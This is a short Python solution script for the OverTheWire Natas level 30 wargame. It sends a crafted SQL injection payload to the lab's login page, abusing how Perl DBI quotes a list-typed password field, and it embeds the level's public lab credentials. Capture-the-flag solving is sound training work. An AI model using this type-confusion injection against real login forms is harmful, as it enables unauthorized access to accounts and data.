#!/usr/bin/env python3
import requests
 
payload = {"username": "natas31", "password": ["'a' or 1", 5]}
 
url = 'http://natas30.natas.labs.overthewire.org/index.pl'
auth = ('natas30', 'wie9iexae0Daihohv8vuu3cei9wahf0e')
resp = requests.post(url, auth=auth, data=payload, proxies={"http": "http://127.0.0.1:8080"})
print(resp.text)